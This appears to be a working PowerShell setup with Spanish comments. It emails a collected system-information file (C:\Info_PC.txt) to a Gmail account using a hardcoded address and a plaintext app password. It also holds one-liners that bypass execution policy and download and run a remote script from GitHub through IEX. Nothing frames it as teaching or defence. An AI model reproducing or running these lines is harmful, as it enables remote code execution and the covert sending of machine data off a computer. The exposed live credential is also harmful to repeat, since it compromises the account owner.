# =========================================================================
#  SCRIPT ENVIADOR
# =========================================================================

$RutaArchivo = "C:\Info_PC.txt"

$MiCorreo        = "gonzalomartinez0369@gmail.com" # 
$PasswordApp     = "zwlf mvcn jtlu hiku"           # 
$ServidorSMTP    = "smtp.gmail.com"                # 
$PuertoSMTP      = 587

if (Test-Path $RutaArchivo) {
    $CuerpoMensaje = Get-Content -Path $RutaArchivo -Raw

    $ConfigCorreo = @{
        From       = $MiCorreo
        To         = $MiCorreo
        Subject    = "Reporte de Sistema - ($($env:COMPUTERNAME))"
        Body       = $CuerpoMensaje
        SmtpServer = $ServidorSMTP
        Port       = $PuertoSMTP
        UseSsl     = $true
    }
    $PasswordSecure = ConvertTo-SecureString $PasswordApp -AsPlainText -Force
    $Credenciales = New-Object System.Management.Automation.PSCredential ($MiCorreo, $PasswordSecure)
    Write-Host "Enviando reporte por email a $MiCorreo..." -ForegroundColor Cyan
    Send-MailMessage @ConfigCorreo -Credential $Credenciales
    Write-Host "¡Correo enviado con éxito!" -ForegroundColor Green
} else {
    Write-Warning "Error: No se encontró el archivo de reporte en la ruta especificada: $RutaArchivo"
}






https://raw.githubusercontent.com/GM0369/auditoria/refs/heads/main/DatosPc.ps1



powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GM0369/auditoria/refs/heads/main/DatosPc.ps1')"

powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GM0369/auditoria/refs/heads/main/DatosPc.ps1')"



powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\DatosPc.ps1" && powershell -ExecutionPolicy Bypass -File "%USERPROFILE%\EnviarReporte.ps1"
